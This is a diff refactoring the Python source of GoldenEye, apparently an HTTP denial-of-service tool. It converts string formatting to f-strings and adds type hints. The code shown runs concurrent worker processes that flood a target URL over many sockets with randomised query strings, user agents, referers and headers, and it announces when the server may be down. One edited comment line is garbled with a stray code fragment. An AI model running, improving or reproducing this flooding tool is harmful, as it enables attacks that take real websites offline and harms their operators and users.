@@ -116,9 +116,9 @@ class GoldenEye(object):
     last_counter = [0, 0]
 
     # Containers
-    workersQueue = []
+    workersQueue: list[str] = []
     manager = None
-    useragents = []
+    useragents: list[str] = []
 
     # Properties
     url = None
@@ -157,11 +157,11 @@ class GoldenEye(object):
     def fire(self):
 
         self.printHeader()
-        print("Hitting webserver in mode '{0}' with {1} workers running {2} connections each. Hit CTRL+C to cancel.".format(
-            self.method, self.nr_workers, self.nr_sockets))
+        print(f"Hitting webserver in mode '{self.method}' with {self.nr_workers} workers running {
+              self.nr_sockets} connections each. Hit CTRL+C to cancel.")
 
         if DEBUG:
-            print("Starting {0} concurrent workers".format(self.nr_workers))
+            print(f"Starting {self.nr_workers} concurrent workers")
 
         # Start workers
         for i in range(int(self.nr_workers)):
@@ -175,8 +175,7 @@ class GoldenEye(object):
                 self.workersQueue.append(worker)
                 worker.start()
             except Exception:
-                error("Failed to start worker {0}".format(i))
-                pass
+                error(f"Failed to start worker {i}")
 
         if DEBUG:
             print("Initiating monitor")
@@ -187,10 +186,13 @@ class GoldenEye(object):
         try:
             if self.counter[0] > 0 or self.counter[1] > 0:
 
-                print("{0} GoldenEye strikes hit. ({1} Failed)".format(
-                    self.counter[0], self.counter[1]))
+                print(f"{self.counter[0]} GoldenEye strikes hit. ({
+                      self.counter[1]} Failed)")
 
-                if self.counter[0] > 0 and self.counter[1] > 0 and self.last_counter[0] == self.counter[0] and self.counter[1] > self.last_counter[1]:
+                if (self.counter[0] > 0 and
+                    self.counter[1] > 0 and
+                    self.last_counter[0] == self.counter[0] and
+                        self.counter[1] > self.last_counter[1]):
                     print("\tServer may be DOWN!")
 
                 self.last_counter[0] = self.counter[0]
@@ -214,7 +216,7 @@ class GoldenEye(object):
                 for worker in self.workersQueue:
                     try:
                         if DEBUG:
-                            print("Killing worker {0}".format(worker.name))
+                            print(f"Killing worker {worker.name}")
                         # worker.terminate()
                         worker.stop()
                     except Exception:
@@ -238,13 +240,13 @@ class Striker(Process):
     host = None
     port = 80
     ssl = False
-    referers = []
-    useragents = []
-    socks = []
+    referers: list[str] = []
+    useragents: list[str] = []
+    socks: list[str] = []
     counter = None
     nr_socks = DEFAULT_SOCKETS
 
-    # Flags
+    # Flagsreferers: List[str] = []
     runnable = True
 
     # Options
@@ -301,13 +303,13 @@ class Striker(Process):
     def run(self):
 
         if DEBUG:
-            print("Starting worker {0}".format(self.name))
+            print(f"Starting worker {self.name}")
 
         while self.runnable:
 
             try:
 
-                for i in range(self.nr_socks):
+                for _ in range(self.nr_socks):
 
                     if self.ssl:
                         if SSLVERIFY:
@@ -332,26 +334,24 @@ class Striker(Process):
 
                 for conn_resp in self.socks:
 
-                    resp = conn_resp.getresponse()
+                    _ = conn_resp.getresponse()
                     self.incCounter()
 
                 self.closeConnections()
 
-            except:
+            except Exception:
                 self.incFailed()
                 if DEBUG:
                     raise
-                else:
-                    pass  # silently ignore
 
         if DEBUG:
-            print("Worker {0} completed run. Sleeping...".format(self.name))
+            print(f"Worker {self.name} completed run. Sleeping...")
 
     def closeConnections(self):
         for conn in self.socks:
             try:
                 conn.close()
-            except:
+            except Exception:
                 pass  # silently ignore
 
     def createPayload(self):
@@ -371,18 +371,17 @@ class Striker(Process):
 
         queryString = []
 
-        for i in range(ammount):
+        for _ in range(ammount):
 
             key = self.buildblock(random.randint(3, 10))
             value = self.buildblock(random.randint(3, 20))
-            element = "{0}={1}".format(key, value)
+            element = f"{key}={value}"
             queryString.append(element)
 
         return '&'.join(queryString)
 
     def generateData(self):
 
-        returnCode = 0
         param_joiner = "?"
 
         if len(self.url) == 0:
@@ -406,7 +405,8 @@ class Striker(Process):
         if self.useragents:
             return random.choice(self.useragents)
 
-        # Mozilla/[version] ([system and browser information]) [platform] ([platform details]) [extensions]
+        # Mozilla/[version] ([system and browser information]) [platform]
+        # ([platform details])[extensions]
 
         # Mozilla Version
         # hardcoded for now, almost every browser is on this version except IE6
@@ -430,30 +430,28 @@ class Striker(Process):
             browser_string = random.choice(browser['name'])
 
             if 'ext_pre' in browser:
-                browser_string = "%s; %s" % (random.choice(
-                    browser['ext_pre']), browser_string)
+                browser_string = f"{random.choice(
+                    browser['ext_pre'])}; {browser_string}"
 
-            sysinfo = "%s; %s" % (browser_string, sysinfo)
+            sysinfo = f"{browser_string}; {sysinfo}"
 
             if 'ext_post' in browser:
-                sysinfo = "%s; %s" % (
-                    sysinfo, random.choice(browser['ext_post']))
+                sysinfo = f"{sysinfo}; {random.choice(browser['ext_post'])}"
 
         if 'ext' in os and os['ext']:
-            sysinfo = "%s; %s" % (sysinfo, random.choice(os['ext']))
+            sysinfo = f"{sysinfo}; {random.choice(os['ext'])}"
 
-        ua_string = "%s (%s)" % (mozilla_version, sysinfo)
+        ua_string = f"{mozilla_version} ({sysinfo})"
 
         if 'name' in platform and platform['name']:
-            ua_string = "%s %s" % (ua_string, random.choice(platform['name']))
+            ua_string = f"{ua_string} {random.choice(platform['name'])}"
 
         if 'details' in platform and platform['details']:
-            ua_string = "%s (%s)" % (ua_string, random.choice(platform['details']) if len(
-                platform['details']) > 1 else platform['details'][0])
+            ua_string = f"{ua_string} ({random.choice(platform['details']) if len(
+                platform['details']) > 1 else platform['details'][0]})"
 
         if 'extensions' in platform and platform['extensions']:
-            ua_string = "%s %s" % (
-                ua_string, random.choice(platform['extensions']))
+            ua_string = f"{ua_string} {random.choice(platform['extensions'])}"
 
         return ua_string
 
@@ -489,8 +487,8 @@ class Striker(Process):
             acceptCharset = ['ISO-8859-1', 'utf-8',
                              'Windows-1251', 'ISO-8859-2', 'ISO-8859-15', ]
             random.shuffle(acceptCharset)
-            http_headers['Accept-Charset'] = '{0},{1};q={2},*;q={3}'.format(
-                acceptCharset[0], acceptCharset[1], round(random.random(), 1), round(random.random(), 1))
+            http_headers['Accept-Charset'] = f'{acceptCharset[0]},{acceptCharset[1]};q={
+                round(random.random(), 1)},*;q={round(random.random(), 1)}'
 
         if random.randrange(2) == 0:
             # Random Referer
@@ -544,7 +542,7 @@ class Striker(Process):
 
 def usage():
     print()
-    print('-----------------------------------------------------------------------------------------------------------')
+    print('---------------------------------------------------------------------------------------')
     print()
     print(GOLDENEYE_BANNER)
     print()
@@ -554,16 +552,16 @@ def usage():
     print('\t Flag\t\t\tDescription\t\t\t\t\t\tDefault')
     print('\t -u, --useragents\tFile with user-agents to use\t\t\t\t(default: randomly generated)')
     print(
-        '\t -w, --workers\t\tNumber of concurrent workers\t\t\t\t(default: {0})'.format(DEFAULT_WORKERS))
+        f'\t -w, --workers\t\tNumber of concurrent workers\t\t\t\t(default: {DEFAULT_WORKERS})')
     print(
-        '\t -s, --sockets\t\tNumber of concurrent sockets\t\t\t\t(default: {0})'.format(DEFAULT_SOCKETS))
-    print('\t -m, --method\t\tHTTP Method to use \'get\' or \'post\'  or \'random\'\t\t(default: get)')
+        f'\t -s, --sockets\t\tNumber of concurrent sockets\t\t\t\t(default: {DEFAULT_SOCKETS})')
+    print('\t -m, --method\t\tHTTP Method to use \'get\', \'post\' or \'random\'\t\t(default: get)')
     print('\t -n, --nosslcheck\tDo not verify SSL Certificate\t\t\t\t(default: True)')
     print(
         '\t -d, --debug\t\tEnable Debug Mode [more verbose output]\t\t\t(default: False)')
     print('\t -h, --help\t\tShows this help')
     print()
-    print('-----------------------------------------------------------------------------------------------------------')
+    print('---------------------------------------------------------------------------------------')
 
 
 def error(msg):
@@ -593,11 +591,11 @@ def main():
         if url[0:4].lower() != 'http':
             error("Invalid URL supplied")
 
-        if url == None:
+        if url is None:
             error("No URL supplied")
 
-        opts, args = getopt.getopt(sys.argv[2:], "ndhw:s:m:u:", [
-                                   "nosslcheck", "debug", "help", "workers", "sockets", "method", "useragents"])
+        opts, _ = getopt.getopt(sys.argv[2:], "ndhw:s:m:u:", [
+            "nosslcheck", "debug", "help", "workers", "sockets", "method", "useragents"])
 
         workers = DEFAULT_WORKERS
         socks = DEFAULT_SOCKETS
@@ -626,16 +624,16 @@ def main():
                 if a in (METHOD_GET, METHOD_POST, METHOD_RAND):
                     method = a
                 else:
-                    error("method {0} is invalid".format(a))
+                    error(f"method {a} is invalid")
             else:
                 error("option '"+o+"' doesn't exists")
 
         if uas_file:
             try:
-                with open(uas_file) as f:
+                with open(uas_file, encoding='utf-8') as f:
                     useragents = f.readlines()
             except EnvironmentError:
-                error("cannot read file {0}".format(uas_file))
+                error(f"cannot read file {uas_file}")
 
         goldeneye = GoldenEye(url)
         goldeneye.useragents = useragents
